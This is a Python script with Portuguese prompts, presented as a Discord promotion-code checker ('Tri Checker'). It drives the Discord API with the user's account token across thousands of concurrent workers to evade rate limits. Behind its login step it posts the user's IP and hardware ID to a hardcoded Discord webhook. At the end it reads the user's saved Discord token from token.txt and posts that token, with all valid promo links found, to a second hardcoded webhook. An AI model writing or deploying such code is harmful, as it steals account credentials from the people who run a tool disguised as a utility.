import os
import aiohttp
import asyncio
import tasksio
from colorama import Fore, Style
import random
from dateutil import parser
import datetime
import requests
import sys
import pyfiglet
import socket
import uuid

def clear():
    os.system("clear||cls")

def title(t):
    os.system(f"title {t}")

class colors:
    def ask(qus):
        print(f"{Fore.LIGHTMAGENTA_EX}[?]{Fore.RESET}{Style.BRIGHT} {qus}{Fore.RESET}{Style.NORMAL}")

    def what(txt):
        print(f"{Fore.LIGHTBLUE_EX}[?]{Fore.RESET}{Style.BRIGHT} {txt}{Fore.RESET}{Style.NORMAL}")

    def banner(txt):
        print(f"{Fore.LIGHTMAGENTA_EX}{Style.BRIGHT}{txt}{Fore.RESET}{Style.NORMAL}")

    def error(txt):
        print(f"{Fore.RED}[{random.choice(['-', '!'])}]{Fore.RESET}{Style.DIM} {txt}{Fore.RESET}{Style.NORMAL}")

    def success(txt):
        print(f"{Fore.GREEN}[+]{Fore.RESET}{Style.BRIGHT} {txt}{Fore.RESET}{Style.NORMAL}")

    def warning(txt):
        print(f"{Fore.LIGHTYELLOW_EX}[!]{Fore.RESET}{Style.DIM} {txt}{Fore.RESET}{Style.NORMAL}")

    def log(txt):
        print(f"{Fore.LIGHTMAGENTA_EX}[!]{Fore.RESET}{Style.BRIGHT} {txt}{Fore.RESET}{Style.NORMAL}")

    def msg(txt, idx):
        return f"{Fore.LIGHTBLUE_EX}[{idx+1}]{Fore.RESET}{Style.BRIGHT} {txt}{Fore.RESET}{Style.NORMAL}"
    
    def ask2(qus):
        print(f"{Fore.LIGHTMAGENTA_EX}[+]{Fore.RESET}{Style.BRIGHT} {qus}{Fore.RESET}{Style.NORMAL}")

    def ask3(qus):
        print(f"{Fore.LIGHTBLUE_EX}[+]{Fore.RESET}{Style.BRIGHT} {qus}{Fore.RESET}{Style.NORMAL}")

clear()
title("Promotion Checker - Feito por reverse7nsss")

bnr = f"{Fore.MAGENTA}{pyfiglet.figlet_format('Tri Checker')}{Fore.RESET}"

colors.banner(bnr+"\n")
colors.warning("Feito por reverse7nsss\n")

def get_token():
    token_file = "token.txt"
    token = ""
    if os.path.exists(token_file):
        with open(token_file, "r") as f:
            token = f.read().strip()
    if not token:
        colors.ask("Token de conta de usuário Discord (necessário para ignorar o limite de taxa):")
        token = input().strip()
        with open(token_file, "w") as f:
            f.write(token)
    return token

def get_ip_and_hwids():
    ip = socket.gethostbyname(socket.gethostname())
    hwid = uuid.getnode()
    return ip, hwid

def login_system():
    colors.ask("Digite seu login:")
    login = input().strip()
    colors.ask("Digite sua senha:")
    password = input().strip()

    login_file_url = "https://raw.githubusercontent.com/pigmine797/userpass/main/userpass.txt"  # Substitua pela URL correta
    try:
        response = requests.get(login_file_url)
        response.raise_for_status()  # Levanta um erro se a resposta for um erro HTTP
        logins = response.text.splitlines()
    except requests.RequestException as e:
        colors.error(f"Erro ao acessar o arquivo de logins: {e}")
        return False, None

    if f"{login}:{password}" in logins:
        ip, hwid = get_ip_and_hwids()
        webhook_url = "https://discord.com/api/webhooks/1268004021298397255/RAESjpPrCuaJ9HdLd3KecH83HY7J1hjZkkT_SKQc4hXMJEl905XlB5AEJwBPOtsyy1XP"  # Substitua pela URL do seu webhook
        
        # Criando o payload com embed para novo acesso
        payload = {
            "embeds": [
                {
                    "title": "<:Pussy_pessoas01:1260663012209983509> Novo acesso do usuário",
                    "description": f"**{login}**",
                    "fields": [
                        {
                            "name": "<:ip:1134953798088016044> IP do usuário",
                            "value": f"`{ip}`",
                            "inline": False
                        },
                        {
                            "name": "<:iconConfig:1262197086376689676> HWID:",
                            "value": f"`{hwid}`",
                            "inline": False
                        }
                    ],
                    "color": 6881535  # Cor em hexadecimal (ex: 7506394 é um tom de roxo)
                }
            ]
        }

        try:
            response = requests.post(webhook_url, json=payload)
            response.raise_for_status()
            if response.status_code == 204:
                colors.success("Login bem-sucedido e informações enviadas para o webhook.")
            else:
                colors.error(f"Falha ao enviar as informações para o webhook. Status code: {response.status_code}")
        except requests.RequestException as e:
            colors.error(f"Erro ao enviar informações para o webhook: {e}")
        return True, login
    else:
        colors.error("Login ou senha inválidos.")
        return False, None

def sort_(file, item):
    with open(file, "r") as f:
        beamed = f.read().split("\n")
        try:
            beamed.remove("")
        except:
            pass
    return item in beamed

def save(file, data):
    with open(file, "a+") as f:
        if not sort_(file, data):
            f.write(data + "\n")
        else:
            colors.warning(f"Duplicado encontrado -> {data}")
            with open("duplicates.txt", "a+") as df:
                df.write(data + "\n")

async def check(promocode):
    async with aiohttp.ClientSession(headers={"Authorization": get_token()}) as cs:
        async with cs.get(f"https://ptb.discord.com/api/v10/entitlements/gift-codes/{promocode}") as rs:
            if rs.status in [200, 204, 201]:
                data = await rs.json()
                if data["uses"] == data["max_uses"]:
                    colors.warning(f"Já reivindicado -> {promocode}")
                    save("claimed.txt", f"https://discord.com/billing/promotions/{promocode}")
                else:
                    try:
                        now = datetime.datetime.utcnow()
                        exp_at = data["expires_at"].split(".")[0]
                        parsed = parser.parse(exp_at)
                        days = abs((now - parsed).days)
                        title = data["promotion"]["inbound_header_text"]
                    except Exception as e:
                        print(e)
                        exp_at = "Failed To Fetch!"
                        days = "Failed To Parse!"
                        title = "Failed To Fetch!"
                    colors.success(f"Válido -> {promocode} | Dias Restantes: {days} | Expira em: {exp_at} | Título: {title}")
                    save("valid.txt", f"https://discord.com/billing/promotions/{promocode}")
            elif rs.status == 429:
                try:
                    deta = await rs.json()
                except:
                    colors.warning("IP Banido.")
                    return
                timetosleep = deta["retry_after"]
                colors.warning(f"Rate Limited For {timetosleep} Seconds!")
                await asyncio.sleep(timetosleep)
                await check(promocode)
            else:
                colors.error(f"Código inválido -> {promocode}")

def count_lines(file):
    with open(file, "r") as f:
        return len(f.readlines())

async def send_to_webhook(file_path, webhook_url, login):
    async with aiohttp.ClientSession() as session:
        with open("token.txt", "r") as f:
            token = f.read().strip()

        with open(file_path, "r") as f:
            links = f.read().strip()  # Lê os links do arquivo

        # Criando o payload com embed para links válidos
        embed_payload = {
            "embeds": [
                {
                    "title": "<:link:1252966514626269194> Novos links válidos do usuário:",
                    "description": f"**{login}**",  # Usando o login obtido na função login_system
                    "fields": [
                        {
                            "name": "<:Tokens:1257681291394945054> Token que foi feita a checagem:",
                            "value": f"`{token}`",
                            "inline": False
                        },
                        {
                            "name": "<a:nitro:1237444356374270074> Links abaixo:",
                            "value": links if links else "Nenhum link válido encontrado.",
                            "inline": False
                        }
                    ],
                    "color": 6881535  # Cor em hexadecimal (ex: 3066993 é um tom de verde)
                }
            ]
        }

        async with session.post(webhook_url, json=embed_payload) as response:
            if response.status == 204:
                colors.success("Mensagem com embed enviada com sucesso para o webhook.")
            else:
                colors.error(f"Falha ao enviar a mensagem com embed para o webhook. Status code: {response.status}")

async def start():
    success, login = login_system()  # Inverti a ordem aqui
    if not success:
        return
    
    codes = open("promotions.txt", "r").read().split("\n")
    try:
        codes.remove("")
    except:
        pass
    async with tasksio.TaskPool(workers=10_000) as pool:
        for promo in codes:
            code = promo.replace('https://discord.com/billing/promotions/', '').replace('https://promos.discord.gg/', '').replace('/', '')
            await pool.put(check(code))
            await asyncio.sleep(delay)

    valid_count = count_lines("valid.txt")
    claimed_count = count_lines("claimed.txt")
    verified_count = count_lines("promotions.txt")
    duplicates_count = count_lines("duplicates.txt") if os.path.exists("duplicates.txt") else 0

    colors.success(f"Testes finalizados: Válidos: {valid_count} | Resgatados: {claimed_count} | Verificados: {verified_count} | Duplicados: {duplicates_count}")

    webhook_url = "https://discord.com/api/webhooks/1268001078633562115/--Cv1dQml7dpcjgAZXSy4mgsFo3XbrU1iG4FPJdwdILwzI1N8WiE4wO1REqNIUOrKVRW"  # Substitua pela URL do seu webhook
    await send_to_webhook("valid.txt", webhook_url, login)

if __name__ == "__main__":
    colors.ask("Delay: ")
    delay = int(input())
    asyncio.run(start())
